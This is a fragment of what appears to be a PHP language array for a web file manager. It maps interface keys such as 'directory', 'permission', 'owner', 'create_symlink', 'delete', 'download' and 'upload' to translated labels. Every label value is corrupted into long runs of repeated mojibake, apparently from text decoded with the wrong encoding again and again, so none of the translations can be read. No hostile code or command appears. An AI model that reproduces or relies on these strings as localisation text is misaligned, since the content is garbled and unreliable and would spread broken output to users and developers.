'directory' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â«Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'file' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¦Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'filename' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',

'size' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â²Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'permission' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'owner' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'group' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â§Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'other' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'functions' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¦Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',

'read' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'write' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'execute' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',

'create_symlink' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'delete' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'rename' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'move' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'copy' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'edit' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'download' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'upload' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
